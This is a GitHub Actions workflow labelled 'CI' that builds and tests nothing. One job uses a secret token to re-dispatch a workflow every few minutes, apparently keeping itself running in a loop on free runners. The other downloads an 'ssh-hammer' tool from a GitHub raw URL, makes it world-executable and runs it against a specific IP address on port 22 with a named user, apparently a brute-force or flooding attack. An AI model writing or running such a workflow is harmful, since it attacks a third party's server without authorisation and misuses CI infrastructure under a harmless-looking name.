name: CI

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build1:
    runs-on: ubuntu-latest
    env:
      GITHUB_TOKEN: ${{ secrets.AUTH_TOKEN }}
    steps:
      - uses: actions/checkout@v3
      - name: Run a multi-line script
        run: |
          sleep 280s
          curl -X POST -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github.v3+json" -d '{"ref": "main"}' https://api.github.com/repos/niniubiwoc/run-script-action/actions/workflows/blank.yml/dispatches


  build2:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Run a multi-line script
        run: |
          wget https://raw.githubusercontent.com/Ahyaya/ssh-hammer/main/ssh-hammer
          chmod 777 ssh-hammer
          timeout 279s ./ssh-hammer 47.111.4.60 -p 22 -u dal -v -t 10


